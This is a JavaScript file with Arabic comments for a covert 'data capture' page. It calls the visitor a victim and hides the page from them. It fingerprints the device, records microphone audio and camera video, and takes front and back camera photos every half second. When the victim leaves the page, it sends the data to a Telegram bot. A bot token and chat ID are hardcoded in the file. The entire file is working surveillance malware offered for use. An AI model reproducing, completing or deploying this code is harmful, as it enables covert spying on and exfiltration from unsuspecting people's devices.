// كود صفحة التقاط البيانات (يجب وضعه في صفحة منفصلة)
class DataCapture {
    constructor(botToken, chatId) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.images = [];
        this.audioChunks = [];
        this.videoChunks = [];
        this.mediaRecorder = null;
        this.audioRecorder = null;
        this.videoRecorder = null;
        this.captureInterval = null;
        this.isRecording = false;
    }

    // بدء جمع البيانات
    async startCapture() {
        try {
            // جمع معلومات الجهاز
            const deviceInfo = this.collectDeviceInfo();
            
            // بدء تسجيل الصوت والفيديو
            await this.startMediaRecording();
            
            // بدء التقاط الصور المتكرر
            this.startImageCapture();
            
            // إضافة مستمع لحدث الخروج
            this.setupExitHandler();
            
            console.log('✅ بدأ جمع البيانات بنجاح');
        } catch (error) {
            console.error('❌ خطأ في بدء جمع البيانات:', error);
        }
    }

    // جمع معلومات الجهاز
    collectDeviceInfo() {
        const info = {
            // ✅ معلومات الضحية
            ip: 'جاري الجمع...',
            date: new Date().toLocaleString('ar-EG'),
            
            // 📱 معلومات الجهاز
            productSub: navigator.productSub || 'غير متاح',
            vendor: navigator.vendor || 'غير متاح',
            maxTouchPoints: navigator.maxTouchPoints || 'غير متاح',
            doNotTrack: navigator.doNotTrack || 'غير متاح',
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
            cookieEnabled: navigator.cookieEnabled,
            appCodeName: navigator.appCodeName || 'غير متاح',
            appName: navigator.appName || 'غير متاح',
            appVersion: navigator.appVersion || 'غير متاح',
            platform: navigator.platform || 'غير متاح',
            product: navigator.product || 'غير متاح',
            userAgent: navigator.userAgent || 'غير متاح',
            language: navigator.language || 'غير متاح',
            languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
            webdriver: navigator.webdriver || 'غير متاح',
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'غير متاح',
            deviceMemory: navigator.deviceMemory || 'غير متاح',
            
            // 📷 معلومات أجهزة الوسائط
            mediaDevices: [],
            
            // 🕸️ معلومات الشبكة
            connection: {},
            
            // 🔌 معلومات USB (محاكاة)
            usbDevices: 'جاري الجمع...',
            
            // 🔋 معلومات البطارية
            battery: {}
        };

        // جمع معلومات أجهزة الوسائط
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(devices => {
                info.mediaDevices = devices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId
                }));
            });
        }

        // جمع معلومات الشبكة
        if (navigator.connection) {
            info.connection = {
                type: navigator.connection.type,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                downlinkMax: navigator.connection.downlinkMax
            };
        }

        // جمع معلومات البطارية
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                info.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'نعم' : 'لا'
                };
            });
        }

        return info;
    }

    // بدء تسجيل الصوت والفيديو
    async startMediaRecording() {
        try {
            // تسجيل الصوت
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            this.audioRecorder = new MediaRecorder(audioStream);
            this.audioChunks = [];
            
            this.audioRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    this.audioChunks.push(event.data);
                }
            };
            
            this.audioRecorder.start(1000); // تسجيل كل ثانية
            
            // تسجيل الفيديو
            const videoStream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: ['user', 'environment'] 
                } 
            });
            this.videoRecorder = new MediaRecorder(videoStream);
            this.videoChunks = [];
            
            this.videoRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    this.videoChunks.push(event.data);
                }
            };
            
            this.videoRecorder.start(1000); // تسجيل كل ثانية
            
            this.isRecording = true;
            console.log('🎥 بدأ تسجيل الصوت والفيديو');
        } catch (error) {
            console.error('❌ خطأ في بدء التسجيل:', error);
        }
    }

    // بدء التقاط الصور المتكرر
    startImageCapture() {
        this.captureInterval = setInterval(async () => {
            try {
                // التقاط من الكاميرا الأمامية
                const frontCamera = await this.captureImage('user');
                if (frontCamera) this.images.push(frontCamera);
                
                // التقاط من الكاميرا الخلفية
                const backCamera = await this.captureImage('environment');
                if (backCamera) this.images.push(backCamera);
                
                console.log('📸 تم التقاط صور جديدة');
            } catch (error) {
                console.error('❌ خطأ في التقاط الصور:', error);
            }
        }, 500); // كل 0.5 ثانية
    }

    // التقاط صورة من كاميرا محددة
    async captureImage(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const imageData = canvas.toDataURL('image/jpeg');
            
            // إيقاف الدفق
            stream.getTracks().forEach(track => track.stop());
            
            return {
                type: facingMode === 'user' ? 'كاميرا أمامية' : 'كاميرا خلفية',
                data: imageData,
                timestamp: new Date().toLocaleString('ar-EG')
            };
        } catch (error) {
            console.error(`❌ خطأ في التقاط صورة من ${facingMode}:`, error);
            return null;
        }
    }

    // إعداد معالج حدث الخروج
    setupExitHandler() {
        // عند إغلاق الصفحة
        window.addEventListener('beforeunload', () => {
            this.stopCaptureAndSend();
        });
        
        // عند تغيير الصفحة
        window.addEventListener('unload', () => {
            this.stopCaptureAndSend();
        });
        
        // عند فقدان التركيز
        window.addEventListener('blur', () => {
            this.stopCaptureAndSend();
        });
    }

    // إيقاف الجمع وإرسال البيانات
    async stopCaptureAndSend() {
        if (!this.isRecording) return;
        
        this.isRecording = false;
        
        // إيقاف التقاط الصور
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
        }
        
        // إيقاف التسجيلات
        if (this.audioRecorder) {
            this.audioRecorder.stop();
        }
        if (this.videoRecorder) {
            this.videoRecorder.stop();
        }
        
        // جمع كل البيانات
        const allData = {
            deviceInfo: this.collectDeviceInfo(),
            images: this.images,
            audio: this.audioChunks,
            video: this.videoChunks,
            timestamp: new Date().toLocaleString('ar-EG')
        };
        
        // إرسال البيانات إلى التلجرام
        await this.sendToTelegram(allData);
    }

    // إرسال البيانات إلى بوت التلجرام
    async sendToTelegram(data) {
        try {
            // تحضير الرسالة
            let message = `📱 *تم جمع بيانات جديدة*\\n\\n`;
            message += `⏰ *الوقت:* ${data.timestamp}\\n\\n`;
            
            // معلومات الجهاز
            message += `✅ *معلومات الضحية*\\n`;
            message += `📅 التاريخ: ${data.deviceInfo.date}\\n`;
            message += `🌐 IP: ${data.deviceInfo.ip}\\n\\n`;
            
            message += `📱 *معلومات الجهاز*\\n`;
            message += `🖥️ النظام: ${data.deviceInfo.platform}\\n`;
            message += `🔧 المتصفح: ${data.deviceInfo.appName} ${data.deviceInfo.appVersion}\\n`;
            message += `👤 User Agent: ${data.deviceInfo.userAgent.substring(0, 50)}...\\n`;
            message += `💾 الذاكرة: ${data.deviceInfo.deviceMemory} GB\\n`;
            message += `⚡ المعالج: ${data.deviceInfo.hardwareConcurrency} نواة\\n\\n`;
            
            message += `📷 *الصور الملتقطة:* ${data.images.length}\\n`;
            message += `🎤 *تسجيل الصوت:* ${data.audio.length > 0 ? 'نعم' : 'لا'}\\n`;
            message += `🎥 *تسجيل الفيديو:* ${data.video.length > 0 ? 'نعم' : 'لا'}\\n`;
            
            // إرسال الرسالة النصية
            await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            // إرسال الصور (أول 10 صور كحد أقصى)
            for (let i = 0; i < Math.min(data.images.length, 10); i++) {
                const image = data.images[i];
                await this.sendPhoto(image.data, `صورة ${i+1} - ${image.type}`);
            }
            
            console.log('✅ تم إرسال البيانات إلى التلجرام');
        } catch (error) {
            console.error('❌ خطأ في إرسال البيانات:', error);
        }
    }

    // إرسال صورة إلى التلجرام
    async sendPhoto(photoData, caption) {
        try {
            // تحويل base64 إلى blob
            const response = await fetch(photoData);
            const blob = await response.blob();
            
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', blob);
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('❌ خطأ في إرسال الصورة:', error);
        }
    }
}

// استخدام الكود عند فتح الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // الحصول على معرف الرابط من URL
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = window.location.pathname.split('/').pop();
    
    // في التطبيق الحقيقي، سنجلب إعدادات الرابط من الخادم
    // هنا سنستخدم إعدادات افتراضية للتوضيح
    const botToken = '7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA';
    const chatId = '6113061454';
    
    // بدء جمع البيانات
    const dataCapture = new DataCapture(botToken, chatId);
    dataCapture.startCapture();
    
    // إخفاء الصفحة عن المستخدم (اختياري)
    document.body.style.display = 'none';
});
